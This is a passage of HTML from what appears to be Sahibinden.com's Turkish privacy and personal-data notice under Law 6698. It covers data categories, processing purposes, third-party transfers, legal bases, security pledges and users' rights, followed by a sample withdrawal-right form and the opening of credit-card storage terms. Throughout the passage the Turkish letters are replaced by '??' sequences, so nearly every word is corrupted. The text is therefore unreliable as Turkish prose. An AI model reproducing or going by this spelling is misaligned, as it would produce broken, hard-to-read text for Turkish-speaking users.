kullan??m?? s??ras??nda olu??an hatalar ve benzeri sorunlar.
              </p>
              <p>
                <strong>Konum Verileri:&nbsp;</strong>Kullan??c??lar??n hassas veya yakla????k konumlar?? ile ilgili verileri kapsar. GPS verisi ile IP ve port adreslerinden ????kar??lan konum verisi, kullan??c?? Sahibinden???in mobil uygulamalar??n?? kullan??rken, kendi bulundu??u konumun etraf??ndaki ilanlar?? aramak ve ilan vermek istemesi durumunda ve kullan??c??n??n izin vermesi halinde kullan??l??r.
              </p>
              <p>
                <strong>??deme Verileri:</strong>&nbsp;Ajans ve m????teri fatura ve ??deme bilgileri (ad??, soyad??, fatura adresi, TC kimlik numaras??, vergi kimlik numaras??), ??yeye g??nderilen faturalar ve ??yelerden al??nan ??demelere ait dekont ??rnekleri, ??deme numaras??, fatura numaras??, fatura tutar??, fatura kesim tarihi gibi veriler.
              </p>
              <p>
                <strong>????erik Verileri:&nbsp;</strong>Markan??n sahte olmad??????na dair talep edilen belgeler (fatura, garanti belgesi vs), ??r??n??n ki??iye ait oldu??unu ya da ??r??n ??zerindeki yetkisini g??steren belgeler (tapu, ruhsat, marka tescil belgesi, yetkilendirme s??zle??mesinin ilgili k??s??mlar?? gibi), ilan bilgileri, yetki belgesi, ??yelik bilgileri, bildirim a????klamas??, ????z??m a????klamas??, memnuniyet, bildirim nedeni, m????teri notu, yenileme tarihi, ilan reddetme nedeni, geri bildirim, belge g??nderim nedeni, Hizmet???in kullan??m?? s??ras??nda belirtilen hata i??eri??i, ara bilgilendirme durumu, ara bilgilendirme, arama nedeni gibi benzer veriler.
              </p>
              <p>
                <strong>S- Garaj??m Bilgileri:</strong> Ara?? foto??raf??, marka, model, kasa tipi, y??l, yak??t, vites, paket ve donan??m bilgileri, ara?? kilometresi, ara?? muayene ve bak??m bilgileri, plaka, lastik de??i??im tarihi, ara?? rengi, arac??n bulundu??u ??ehir, arac??n boyal?? ve de??i??en par??a bilgisi, ruhsat belgesi, trafik sigortas?? belgesi, kasko belgesi ve muayene belgesi verileridir.
              </p>
              <p>
                <strong>Anket Cevaplar??:</strong>&nbsp;Sahibinden taraf??ndan Portal dahilinde d??zenlenen periyodik anketlere verilen cevaplar ile Sahibinden???in i??birli??i yapt?????? ger??ek ve t??zel ki??iler taraf??ndan yap??lan anketlere verilen cevaplar.
              </p>
              <p>
                <strong>Parmak ??zi:&nbsp;</strong>Mobil uygulamada ??ifre kullan??m?? yerine parmak izi ile giri?? uygulamas??n?? tercih edebilirsiniz. Mobil cihaz??n ayarlar k??sm??ndan yapaca????n??z parmak izi tan??mlamas?? ile ger??ekle??tirilecek i??lem kapsam??nda Sahibinden???e parmak iziniz hi??bir ??ekilde iletilmeyecektir. Mobil cihaz ??zerinden Sahibinden???e sadece do??rulama ya da hata uyar??s?? gelmekte ve buna istinaden uygulamaya giri??iniz sa??lanmaktad??r. Onay gelmedi??i takdirde i??lemi tekrarlamaya ya da ba??ka bir yolla giri?? yapmaya y??nlendirilirsiniz. Parmak izi ile giri?? se??ene??ini cihaz??n??z??n ayarlar b??l??m??nden her zaman kapatabilirsiniz.
              </p>
              <p>
                <strong>Filtrelere Tak??lm???? veya Kullan??m Ko??ullar??na Ayk??r?? ????erikteki Site ????i Mesajlar: </strong>Kullan??c??lar aras??nda g??venli ileti??im ve ticaret yap??labilmesi i??in kullan??c??lar??n birbirlerine g??nderdikleri site i??i mesajlardan sadece filtrelere tak??lanlar veya gelen ??ikayet/bildirim ??zerine kullan??m ko??ullar??na ayk??r?? i??erikte tespit edilen site i??i mesajlard??r.
              </p>
              <p>
                <strong>Ki??isel Veriler Nerede Depolan??r ve ????lenir?</strong>
              </p>
              <p> Elde etti??imiz ki??isel verileriniz yurti??inde veya yurtd??????nda Sahibinden???in ya da ba??l?? kurulu??lar??n??n, alt kurulu??lar??n??n veya i??birli??i i??inde bulundu??u hizmet servis sa??lay??c??lar??n??n tesisi bulunan ba??ka bir ??lkede depolanabilir ve i??bu Bilgilendirme???deki ama??lar do??rultusunda ve bu ama??larla orant??l?? olarak i??lenebilir.</p>
              <p> ????bu Bilgilendirme kapsam??nda toplanan ki??isel verileriniz burada yer alan h??k??mlere ve verilerin depoland?????? ve i??lendi??i ??lkede y??r??rl??kte olan mevzuat kapsam??nda ve ??ng??r??len g??venlik ??nlemleri d??hilinde i??lenecektir.</p>
              <p>
                <strong>c) Ki??isel Verilerin Hangi Ama??la ????lenece??i</strong>
              </p>
              <p> ????bu Bilgilendirme ile ??yelik S??zle??mesi???nde yer alan ama??lar do??rultusunda ki??isel verileriniz, 6698 Say??l?? Ki??isel Verilerin Korunmas?? Kanunu ile d??zenlenen ??lkeler ve ????leme ??artlar?? uyar??nca ve a??a????da detaylar?? belirtilen ama??lar dairesinde i??lenecektir:</p>
              <p>
                <strong>Ad ve ??leti??im Bilgileri:</strong>&nbsp;??irket i??i de??erlendirme, ileti??im, Kullan??c?? kay??t, potansiyel m????teri bilgisi elde etmek, sat???? sonras?? s??re??lerin geli??tirilmesi, i?? geli??tirme, tahsilat, m????teri portf??y y??netimi, promosyon, &nbsp;analiz, ??ikayet y??netimi, m????teri memnuniyeti s??re??lerini y??netmek, pazarlama, reklam, ara??t??rma, faturaland??rma, etkinlik bilgilendirmesi, operasyonel faaliyetlerin y??r??t??lmesi, hizmet kalitesinin ??l????lmesi, geli??tirilmesi, denetim, kontrol, optimizasyon, m????teri do??rulama, sat????, sat???? sonras?? hizmetleri, doland??r??c??l??????n tespiti ve ??nlenmesi, ??evrimi??i e??itim toplant??lar??na kat??l??m sa??lamak;
              </p>
              <p>
                <strong>Kimlik Do??rulama Bilgileri:</strong>&nbsp;Kullan??c?? kay??t, sorun/hata bildirimi, kontrol, operasyonel faaliyetlerin geli??tirilmesi, y??r??t??lmesi, sat???? sonras?? s??re??lerin geli??tirilmesi, i?? geli??tirme, tahsilat, ??irket i??i de??erlendirme, m????teri portf??y y??netimi, hizmet kalitesinin ??l????lmesi, ileti??im, optimizasyon, moderasyon, denetim, risk y??netimi, m????teri do??rulama, doland??r??c??l??????n tespiti ve ??nlenmesi;
              </p>
              <p>
                <strong>Demografik Veriler:</strong>&nbsp;Promosyon, ??irket i??i de??erlendirme, analiz, ileti??im, sat???? sonras?? s??re??lerin geli??tirilmesi, i?? geli??tirme, tahsilat,&nbsp;kullan??m verileri ve ilgi alanlar??, s??k kullan??lanlar, pazarlama, sat????, reklam, denetim ve kontrol, risk y??netimi, ??irket i??i de??erlendirme, m????teri portf??y y??netimi, sat???? sonras?? hizmetler, hizmet kalitesinin ??l????lmesi, geli??tirilmesi, ??ikayet y??netimi s??re??lerini y??r??tmek, operasyonel faaliyetlerin y??r??t??lmesi ve geli??tirilmesi, kay??t, sorun/hata bildirimi;
              </p>
              <p>
                <strong>Kullan??m Verileri ve S??k Kullan??lanlar:&nbsp;</strong>Kullan??c?? kay??t, sorun/hata bildirimi, kontrol, sorgulama, operasyonel faaliyetlerin y??r??t??lmesi ve geli??tirilmesi, sat???? sonras?? hizmetler ve sat???? sonras?? s??re??lerin geli??tirilmesi, i?? geli??tirme, tahsilat, ??irket i??i de??erlendirme, ??evrimi??i davran????sal reklamc??l??k ve pazarlama, m????teri portf??y y??netimi, hizmet kalitesinin ??l????lmesi ve geli??tirilmesi, ileti??im, &nbsp;optimizasyon, denetim, risk y??netimi ve kontrol, promosyon, analiz, ilgi alanlar?? belirleme, skorlama, profilleme, pazarlama, sat????, reklam, ??ikayet y??netimi s??re??lerini y??r??tmek, kay??t, sorun/hata bildirimi;
              </p>
              <p>
                <strong>Konum verileri:</strong>&nbsp;Konuma ba??l?? veya konumla ili??kili Portal fonksiyonlar??n??n kulland??r??lmas??, denetim ve kontrol, risk y??netimi;
              </p>
              <p>
                <strong>??deme Verileri:</strong>&nbsp;Faturaland??rma s??recini y??netmek, muhasebe, sat???? sonras?? s??re??lerin geli??tirilmesi, i?? geli??tirme, tahsilat, ??irket i??i de??erlendirme, skorlama, profilleme, m????teri portf??y y??netimi, sat???? sonras?? hizmetler, ileti??im, pazarlama, denetim, kontrol, ??deme hizmet sa??lay??c??lar?? ile y??r??t??len s??re??ler;
              </p>
              <p>
                <strong>??</strong>
                <strong style="text-align: justify;">??erik: </strong>
                <span style="text-align: justify;">???? geli??tirme, optimizasyon, m????teri portf??y y??netimi, denetim, kontrol, operasyonel faaliyetlerin y??r??t??lmesi ve geli??tirilmesi, ilan operasyonlar??n??n y??r??t??lmesi, promosyon, ??irket i??i de??erlendirme, m????teri y??netimi, analiz, skorlama, profilleme, sat???? sonras?? s??re??lerin geli??tirilmesi, tahsilat, sat???? sonras?? hizmetler, ileti??im, hizmet kalitesi ??l????lmesi ve geli??tirilmesi, mevzuata uyum gerekliliklerinin yerine getirilmesi, ??ikayet y??netimi s??re??lerinin y??r??t??lmesi;</span>
              </p>
              <p style="text-align:justify">
                <o:p></o:p>
              </p>
              <p>
                <strong>S-Garaj??m Bilgileri:</strong> Sahibinden taraf??ndan S-Garaj??m hizmetinin yerine getirilmesi ve operasyonel faaliyetlerin y??r??t??lmesi, i?? geli??tirme;
              </p>
              <p>
                <strong>Anket ve Test Cevaplar??:</strong>&nbsp;Sahibinden taraf??ndan Portal dahilinde d??zenlenen periyodik anketlere veya testlere cevap veren kullan??c??lardan talep edilen bilgiler, Sahibinden ile Portal fonksiyonlar??n??n kulland??r??lmas?? ve bu fonksiyonlar??n Sahibinden taraf??ndan yerine getirilebilmesi i??in i??birli??i yapt?????? ger??ek ve/veya t??zel ki??iler ile Portal?????n kullan??m ama??lar??na uygun olarak yukar??da belirtilen t??m i??leme faaliyetleri kapsam??nda i??birli??i yapt?????? ??????nc?? ger??ek ve t??zel ki??iler taraf??ndan bu kullan??c??lara do??rudan pazarlama yapma, istatistik?? analiz yapma, s??re??lerini iyile??tirme ve veri taban?? olu??turma;
              </p>
              <p> Sahibinden ile i?? ili??kisi i??erisinde olan ??????nc?? ger??ek veya t??zel ki??iler ile yap??lan s??zle??meler veya y??r??t??len faaliyetler ile yasal d??zenlemelerden do??an y??k??ml??l??kler ??er??evesinde hukuki ve ticari y??k??ml??l??klerin ger??ekle??tirilmesi i??in Sahibinden taraf??ndan i?? orta????/m????teri/tedarik??iler ile yap??lan s??zle??melerden kaynaklanan y??k??ml??l??kleri ifa etme, hak tesis etme, haklar?? koruma, ticari ve hukuki de??erlendirme s??re??lerini y??r??tme, hukuki ve ticari risk analizleri yapma, hukuki uyum s??recini y??r??tme, ilgili yasal mevzuatlarda belirtilen belgeleri kullan??c??n??n al??p alamayaca????na y??nelik yap??lan testleri sonu??land??rma, mali i??leri y??r??tme, yasal gereklilikleri yerine getirme, yetkili kurum, kurulu?? ve mercilerin kararlar??n?? yerine getirme, taleplerini cevaplama ama??lar??yla 6698 say??l?? Kanun???un 5. ve 6. maddelerinde belirtilen ki??isel veri i??leme ??artlar?? ve ama??lar?? dahilinde i??lenecektir.</p>
              <p>
                <strong>Filtrelere Tak??lm???? veya Kullan??m Ko??ullar??na Ayk??r?? ????erikteki Site ????i Mesajlar: </strong>Mesajla??ma hizmetimiz, kullan??c??lar??m??z??n al??m, sat??m ve kiralama i??lemlerinde kar???? taraf ile ileti??im kurmalar??n?? kolayla??t??rmak amac?? ile sunulmaktad??r. Bu kapsamdaki mesajlarda; Kanun???un 5. Maddesindeki me??ru menfaate dayal?? olarak, hakaret i??eren, genel ahlaka ayk??r??, doland??r??c??l??k maksatl?? ilan verildi??i konusunda ????phe uyand??ran, haks??z rekabete neden olabilecek, ki??ilik haklar??n??, fikri ve s??nai m??lkiyet haklar??n?? ihlal eden ve sair surette hukuka ayk??r??l??k i??eren mesajlar filtrelenerek moderasyona tabi tutulmakta, &nbsp;kullan??m ko??ullar??na ayk??r?? i??erikteki site i??i mesajlar incelenerek engellenebilmektedir.
              </p>
              <p>
                <strong>Ki??isel Verileri Saklama S??resi</strong>
              </p>
              <p> Sahibinden, elde etti??i ki??isel verileri, Kullan??c??lar???a Hizmet???ten en iyi ??ekilde faydalanabilmeleri i??in i??bu Bilgilendirme ile ??yelik S??zle??mesi???nde belirtilen ??artlar ??er??evesinde ve ??yelik S??zle??mesi???nin mahiyetinden kaynaklanan y??k??ml??l??kleri yerine getirebilmesi ad??na i??lendikleri ama?? i??in gerekli olan s??re kadar muhafaza edecektir.</p>
              <p> Buna ek olarak, Sahibinden, ??yelik S??zle??mesi???nden do??abilecek herhangi bir uyu??mazl??k durumunda, uyu??mazl??k kapsam??nda idari veya yarg?? s??re??lerinin y??r??t??lebilmesi amac??yla s??n??rl?? olmak ??zere ve ilgili mevzuat uyar??nca belirlenen zamana????m?? s??releri boyunca ki??isel verileri saklayacakt??r.</p>
              <p>
                <strong>??) ????lenen Ki??isel Verilerin Kimlere ve Hangi Ama??la Aktar??labilece??i</strong>
              </p>
              <p> Sahibinden, Kullan??c??ya ait ki??isel verileri ve bu ki??isel verileri kullan??larak elde etti??i yeni verileri veya Kullan??c??lar??n kendilerinin pozitif hareketleriyle Portal???a girdikleri ki??isel bilgileri ba??ta ??yelik S??zle??mesi gereklerini ve Hizmetler???i ifa etmek, Kullan??c?? deneyimini geli??tirmek (iyile??tirme ve ki??iselle??tirme dahil), Kullan??c??lar??n g??venli??ini sa??lamak, doland??r??c??l?????? tespit etmek ve ??nlemek, Hizmet???leri geli??tirmek, Hizmet???ler i??in ??nem arz edebilecek nitelikteki sorgulama faaliyetlerini ger??ekle??tirmek, operasyonel de??erlendirme ara??t??rmas?? yapmak, hatalar?? gidermek, Kullan??c?? kimliklerini do??rulamak, sistem performans??n?? geli??tirmek, ??evrimi??i e??itim faaliyetlerinin sa??lanmas?? olmak ??zere yukar??da i??leme ama??lar?? k??sm??nda belirtilen ama??lardan herhangi birini ger??ekle??tirebilmek i??in d???? kaynak hizmet sa??lay??c??lar, i?? ortaklar??, tedarik??iler, ekspertiz ve gayrimenkul dan????manl?????? firmalar??; Hizmetler???i ifa ederken aktar??m??n gerektirdi??i ??l????de kurumsal ??yeler, &nbsp;kargo ??irketleri, hukuk b??rolar??, ara??t??rma ??irketleri, ??a??r?? merkezleri,&nbsp;Sahibinden Akademi ve benzeri ??evrimi??i e??itim platformlar??, ??ikayet y??netimi ve g??venli??in sa??lanmas??na ili??kin yaz??l??m ??irketleri, ajanslar, dan????manl??k ??irketleri, bas??m sekt??r??nde yer alan ??irketler, bankalar??n emlak sat????lar?? i??in bankalar, emlak projeleri ile ilgili olarak m??teahhitlik firmalar??, sosyal medya mecralar??, belgelendirme kurulu??lar?? dahil ??????nc?? ger??ek ve/veya t??zel ki??iler ile ve yasal zorunluluklar kapsam??nda yetkili kurum, kurulu??, merci, idari, yarg?? organlar?? ve ba????ms??z denetim ??irketleri ile payla??maktad??r.</p>
              <p> Ayr??ca, Kullan??c??n??n Ad ve ??leti??im Bilgileri, ??deme a??amas??nda onaylayaca???? ??deme kurulu??u ??er??eve s??zle??mesi uyar??nca ve&nbsp;9 Ocak 2008 tarihli ve 26751 say??l?? Resmi Gazete???de yay??mlanan Su?? Gelirlerinin Aklanmas??n??n ve Ter??r??n Finansman??n??n ??nlenmesine Dair Tedbirler Hakk??nda Y??netmelik uyar??nca kimlik do??rulamas?? ger??ekle??tirilmesi amac??yla&nbsp;??deme kurulu??lar??yla payla????lacakt??r.</p>
              <p> Cihaz??n??za yerle??tirilen ??erezler arac??l??????yla elde edilen ki??isel verileriniz ??????nc?? ki??iler ile i??bu Bilgilendirme???de belirtilen kapsam ve ama??larla payla????labilecektir.</p>
              <p> Sahibinden ki??isel verileri yukar??da belirtilen kategoriler ve ama??lar dahilinde bu ama??larla s??n??rl?? ve orant??l?? olmak ??zere yurt i??inde ??????nc?? ki??ilere aktarabilece??i gibi yurt d??????na da aktarabilecektir.</p>
              <p>
                <strong>d) Ki??isel Veri Toplaman??n Y??ntemi ve Hukuki Sebebi</strong>
              </p>
              <p> Sahibinden, daha etkin bir ??ekilde ??al????mak ve size en iyi deneyimi sunmak i??in ki??isel verilerinizi toplamaktad??r. Sahibinden, ki??isel verilerinizi, do??rudan sizden (veri sahibi), sizin ad??n??za hareket eden vekil ve/veya hareket etmeye yetkili ki??iler taraf??ndan verileriniz a??a????daki y??ntemler kullan??larak toplanmaktad??r:</p>
              <p>
                <strong>Do??rudan Sahibinden???e Vermi?? Oldu??unuz Veriler:&nbsp;</strong>Hizmet???in ifas?? i??in ve Portal?????n kullan??m?? ??ncesinde veya s??ras??nda, Sahibinden???e Kullan??c??lar??n kendi inisiyatifleri do??rultusunda verdikleri ki??isel verileri ifade eder. Bu ki??isel veriler, do??rudan Kullan??c??lar taraf??ndan Sahibinden???e pozitif hareketleri neticesinde verilen t??m ki??isel verileri kapsar. ??rne??in, ad-soyad, ileti??im bilgileri, kimlik bilgileri, anketlere verilen cevaplar, demografik veriler ve i??erik bilgileri bu t??r verilere girmektedir.
              </p>
              <p>
                <strong>Platformumuzu Kulland??????n??z Zaman Elde Etti??imiz Veriler:&nbsp;</strong>Sahibinden???in sundu??u hizmet s??ras??nda, belirli yaz??l??m ya da teknolojik ara??lar vas??tas??yla al??nan Kullan??c??lar??n kullan??m al????kanl??klar??na ili??kin ki??isel verileri kapsamaktad??r. ??rne??in, konum verileri ve s??k kullan??lanlar ile birlikte ilgi alanlar?? ve kullan??m verileri bu t??r verilere girmektedir.
              </p>
              <p> Sahibinden, ??evrimi??i davran????sal reklamc??l??k ve pazarlama yap??labilmesi amac??yla siteye gelen kullan??c??n??n ??ye olmasalar dahi sitedeki davran????lar??n?? taray??c??da bulunan bir cookie (??erez) ile ili??kilendirme ve g??r??nt??lenen sayfa say??s??, ziyaret s??resi ve hedef tamamlama say??s?? gibi kullan??m verilerini toplamaktad??r. ??erezlerin nas??l y??netilece??i ayr??ca ??erez Politikam??zda belirtilmi??tir.</p>
              <p> Bu y??ntemlerle toplanan ki??isel verileriniz 6698 say??l?? Kanun???un 5. ve 6. maddelerinde belirtilmi?? olan;</p>
              <ul>
                <li> Kanunlarda a????k??a ??ng??r??lm???? olmas??,</li>
                <li> Hukuki y??k??ml??l??????n?? yerine getirebilmek i??in zorunlu olmas?? (Elektronik ticaret faaliyetlerini, maliyeye ve vergiye ait hususlar??, t??keticinin korunmas??n?? ve sair konular?? d??zenleyen yasal d??zenlemeler),</li>
                <li> S??zle??menin kurulmas?? veya ifas??yla do??rudan do??ruya ilgili olup i??lemenin gerekli olmas?? (??yelik S??zle??mesi, Kullan??m Ko??ullar?? ve bunlara dayal?? olarak s??zle??menin ifas??, hakk??n tesisi ve korunmas??),</li>
                <li> Me??ru menfaati i??in i??lemenin zorunlu olmas?? (Sahibinden???in Portal ile ilgili faaliyetlerinde ??zellikle doland??r??c??l?????? engellemek ba??ta olmak ??zere hizmetleri y??r??tebilmesi i??in gerekli olan verileri toplamas??),</li>
                <li> Taraf??n??zca alenile??tirilmi?? olmas??,</li>
                <li> Bir hakk??n tesisi, kullan??lmas?? veya korunmas?? i??in i??lemenin zorunlu olmas??,</li>
                <li> A????k r??zan??z??n bulunmas??</li>
              </ul>
              <p> ??eklindeki hukuki sebeplere dayanmaktad??r.</p>
              <p> Bu y??ntemlerle toplanan ki??isel verileriniz 6698 say??l?? Kanun???un 5. ve 6. maddelerinde belirtilen ki??isel veri i??leme ??artlar?? ve ama??lar?? kapsam??nda bu Bilgilendirme???de belirtilen ama??larla i??lenebilmekte ve aktar??labilmektedir.</p>
              <p> Ki??isel verileri toplaman??n hukuki dayanaklar??;</p>
              <ul>
                <li> ??yelik S??zle??mesi, Kullan??m Ko??ullar?? ve bunlara dayal?? olarak s??zle??menin ifas??, hakk??n tesisi ve korunmas??</li>
                <li> Elektronik ticaret faaliyetlerini, maliyeye ve vergiye ait hususlar??, t??keticinin korunmas??n?? ve sair konular?? d??zenleyen yasal d??zenlemeler</li>
                <li> Sahibinden???in Portal ile ilgili faaliyetlerinde ??zellikle doland??r??c??l?????? engellemek ba??ta olmak ??zere hizmetleri y??r??tebilmesi i??in gerekli olan verileri toplamas??ndaki me??ru menfaatine dayanmaktad??r.</li>
              </ul>
              <p>
                <strong>e) Veri G??venli??ine ??li??kin ??nlemlerimiz ve Taahh??tlerimiz</strong>
              </p>
              <p> Sahibinden, ki??isel verileri g??venli bir ??ekilde korumay?? taahh??t eder. Ki??isel verilerin hukuka ayk??r?? olarak i??lenmesini ve eri??ilmesini engellemek ve ki??isel verilerin muhafazas??n?? sa??lamak amac??yla uygun g??venlik d??zeyini temin etmeye y??nelik teknik ve idari tedbirleri ??e??itli y??ntemler ve g??venlik teknolojileri kullanarak ger??ekle??tirmektedir.</p>
              <p> Sahibinden, elde etti??i ki??isel verileri bu i??bu Bilgilendirme ve 6698 Say??l?? Ki??isel Verilerin Korunmas?? Kanunu h??k??mlerine ayk??r?? olarak ba??kas??na a????klamayacakt??r ve i??leme amac?? d??????nda kullanmayacakt??r. Sahibinden, i??bu Bilgilendirme uyar??nca d???? kaynak hizmet sa??lay??c??larla Kullan??c??lar???a ait ki??isel verilerin payla????lmas?? durumunda, s??z konusu d???? kaynak tedarik??ilerinin de i??bu madde alt??nda yer alan taahh??tlere riayet etmeleri i??in gerekli uyar?? ve denetim faaliyetlerini icra edece??ini beyan eder.</p>
              <p> Portal ??zerinden ba??ka uygulamalara link verilmesi halinde Sahibinden, link verilen uygulamalar??n gizlilik politikalar?? ve i??eriklerine y??nelik herhangi bir sorumluluk ta????mamaktad??r.</p>
              <p> Kullan??c??, i??bu Bilgilendirmeye konu bilgilerinin tam, do??ru ve g??ncel oldu??unu, bu bilgilerde herhangi bir de??i??iklik olmas?? halinde bunlar?? derhal&nbsp; <a href="https://banaozel.sahibinden.com/">https://banaozel.sahibinden.com/</a>&nbsp;adresinden g??ncelleyece??ini taahh??t eder. Kullan??c?????n??n g??ncel bilgileri sa??lamam???? olmas?? halinde Sahibinden???in herhangi bir sorumlulu??u olmayacakt??r. </p>
              <p>
                <strong>f) Ki??isel Veri Sahibi???nin 6698 say??l?? Kanun???un 11. maddesinde Say??lan Haklar??</strong>
              </p>
              <p> Ki??isel veri sahipleri olarak, haklar??n??za ili??kin taleplerinizi a??a????da d??zenlenen y??ntemlerle Sahibinden???e iletmeniz durumunda Sahibinden talebin niteli??ine g??re talebi en k??sa s??rede ve en ge?? otuz g??n i??inde sonu??land??racakt??r. Verilecek cevapta on sayfaya kadar ??cret al??nmayacakt??r. On sayfan??n ??zerindeki her sayfa i??in 1 T??rk Liras?? i??lem ??creti al??nacakt??r. Ba??vuruya cevab??n CD,&nbsp;flash&nbsp;bellek gibi bir kay??t ortam??nda verilmesi halinde Sahibinden taraf??ndan talep edilebilecek ??cret kay??t ortam??n??n maliyetini ge??meyecektir.</p>
              <p> Bu kapsamda ki??isel veri sahipleri;</p>
              <ul>
                <li> Ki??isel verilerinin i??lenip i??lenmedi??ini ????renme,</li>
                <li> Ki??isel verileri i??lenmi??se buna ili??kin bilgi talep etme,</li>
                <li> Ki??isel verilerin i??lenme amac??n?? ve bunlar??n amac??na uygun kullan??l??p kullan??lmad??????n?? ????renme,</li>
                <li> Yurt i??inde veya yurt d??????nda ki??isel verilerin aktar??ld?????? ??????nc?? ki??ileri bilme,</li>
                <li> Ki??isel verilerin eksik veya yanl???? i??lenmi?? olmas?? h??linde bunlar??n d??zeltilmesini isteme ve bu kapsamda yap??lan i??lemin ki??isel verilerin aktar??ld?????? ??????nc?? ki??ilere bildirilmesini isteme,</li>
                <li> 6698 say??l?? Kanun ve ilgili di??er kanun h??k??mlerine uygun olarak i??lenmi?? olmas??na ra??men, i??lenmesini gerektiren sebeplerin ortadan kalkmas?? halinde ki??isel verilerin silinmesini veya yok edilmesini isteme ve bu kapsamda yap??lan i??lemin ki??isel verilerin aktar??ld?????? ??????nc?? ki??ilere bildirilmesini isteme,</li>
                <li> ????lenen verilerin m??nhas??ran otomatik sistemler vas??tas??yla analiz edilmesi suretiyle ki??inin kendisi aleyhine bir sonucun ortaya ????kmas??na itiraz etme,</li>
                <li> Ki??isel verilerin kanuna ayk??r?? olarak i??lenmesi sebebiyle zarara u??ramas?? halinde zarar??n giderilmesini talep etme haklar??na sahiptir.</li>
              </ul>
              <p> Yukar??da belirtilen haklar??n??z?? kullanmak ile ilgili talebinizi, Veri Sorumlusuna Ba??vuru Usul ve Esaslar?? Hakk??nda Tebli??'in 5. maddesi uyar??nca, T??rk??e olarak; veri sorumlusu s??fat??yla Sahibinden'in De??irmen Yolu Cad. No:28 Asia OfisPark A Blok Kat:2 34752 Ata??ehir/??stanbul/T??rkiye adresine kimli??inizi tevsik edici bilgi ve belgeler ile yaz??l?? olarak, <a href="mailto:sahibinden@hs02.kep.tr">sahibinden@hs02.kep.tr</a>&nbsp;adresine kay??tl?? elektronik posta (KEP) ile, <a href="mailto:kvk@sahibinden.com">kvk@sahibinden.com</a> adresine g??venli elektronik imza, mobil imza ile veya ilgili ki??i taraf??ndan Sahibinden sisteminde kay??tl?? bulunan elektronik posta adresini kullanmak suretiyle iletebilirsiniz. </p>
              <p> Sahibinden'in ki??isel verilerinizin hukuka ayk??r?? payla????m??n??n ??nlenmesi amac??yla kimli??inizi do??rulama hakk?? sakl??d??r.</p>
              <p> Ba??vurunuzda;</p>
              <ol>
                <li> Ad??n??z??n,&nbsp;soyad??n??z??n&nbsp;ve ba??vuru yaz??l?? ise imzan??z??n,</li>
                <li> T??rkiye Cumhuriyeti vatanda??lar?? i??in T.C. kimlik numaran??z??n, yabanc?? iseniz uyru??unuzun, pasaport numaran??z??n veya varsa kimlik numaran??z??n,</li>
                <li> Tebligata esas yerle??im yeri veya i?? yeri adresinizin,</li>
                <li> Varsa bildirime esas elektronik posta adresi, telefon ve faks numaran??z??n,</li>
                <li> Talep konunuzun,</li>
              </ol>
              <p> bulunmas??&nbsp;zorunlu olup varsa konuya ili??kin bilgi ve belgelerin de ba??vuruya eklenmesi gerekmektedir.</p>
            </span>
          </div>
          <div id="recantationFormExample" class="recantationFormExample">
            <div class="agreement">
              <h4>Cayma Hakk?? Formu ??rne??i</h4>
              <p style="margin:15px 0 15px 0">
                <strong>Kime:</strong> (SATICI???n??n ismi, unvan??, adresi varsa faks numaras?? ve e-posta adresi yer alacakt??r.)
              </p>
              <p style="margin:0 0 15px 0"> Bu form ile a??a????daki mallar??n sat??????na veya hizmetlerin sunulmas??na ili??kin s??zle??meden cayma hakk??m?? kulland??????m?? beyan ederim. </p>
              <p style="margin:0 0 15px 0">
                <strong>Sipari?? tarihi veya teslim tarihi:</strong>
              </p>
              <p style="margin:0 0 15px 0">
                <strong>Cayma hakk??na konu mal veya hizmet:</strong>
              </p>
              <p style="margin:0 0 15px 0">
                <strong>Cayma hakk??na konu mal veya hizmetin bedeli:</strong>
              </p>
              <p style="margin:0 0 15px 0">
                <strong>ALICI???n??n ad?? ve soyad??:</strong>
              </p>
              <p style="margin:0 0 15px 0">
                <strong>ALICI???n??n adresi:</strong>
              </p>
              <p style="margin:0 0 15px 0">
                <strong>ALICI???n??n imzas??: </strong>(Sadece ka????t ??zerinde g??nderilmesi halinde)
              </p>
              <p style="margin:0 0 15px 0">
                <strong> Tarih:</strong>
              </p>
            </div>
          </div>
          <div id="creditcardSavingAgreement" class="creditcardSavingAgreement">
            <h1>Kredi Kart?? Saklama Ko??ullar??</h1>
            <p>sahibinden.com taraf??ndan sunulan hizmetler ile sahibinden.com taraf??ndan sat??n al??nmas??na arac??l??k edilen ??r??n ve hizmetlerin al??m??nda; kredi kart?? bilgilerinin kaydedilmesine ve kaydedilmi?? kredi kart?? bilgilerinin kullan??lmas??na ili??kin bilgiler ile ilgili beyan??m a??a????da yer almaktad??r: </p>
            <br>
            <p> ????bu Kullan??c?? Beyan?? ile; PAYTEN TEKNOLOJ?? A.??. (???PAYTEN???)(eski unvan?? ASSECO SEE TEKNOLOJ?? A.??. k??saca ???ASSECO???)???ye sundu??um kredi kart?? bilgilerinin PAYTEN taraf??ndan kaydedilmesine, saklanmas??na, SAH??B??NDEN B??LG?? TEKNOLOJ??LER?? PAZARLAMA ve T??CARET A.??. (???SAH??B??NDEN???) taraf??ndan verilecek tahsilat talimatlar??na uygun olarak PAYTEN arac??l??????yla SAH??B??NDEN ad??na ??demenin ger??ekle??tirilmesi amac??yla kredi kart?? bilgilerimin kullan??lmas??na ve tahsilata ili??kin i??lem sonu??lar??n??n SAH??B??NDEN???e iletilmesine muvafakat etti??imi kabul, beyan ve taahh??t ederim. </p>
            <br>
            <p>
              <strong>
                <u>sahibinden.com taraf??ndan sat??n al??nmas??na arac??l??k edilen ??r??n ve hizmetlere ili??kin bilgi:</u>
              </strong>
              <br>sahibinden.com taraf??ndan sat??n al??nmas??na arac??l??k edilen ??r??n ve hizmetlere ili??kin Kullan??c??lar??n kredi kart?? bilgileri sadece PAYTEN???de saklanmakta olup, kredi kart??ndan tahsilat i??lemleri SAH??B??NDEN???in talimat?? ile ??YZ?? ??DEME VE ELEKTRON??K PARA H??ZMETLER?? A.??. (?????YZ??CO???) taraf??ndan ger??ekle??tirilmekte, kredi kart?? bilgileri ??YZ??CO ve SAH??B??NDEN taraf??ndan saklanmamaktad??r.
            </p>
            <br>
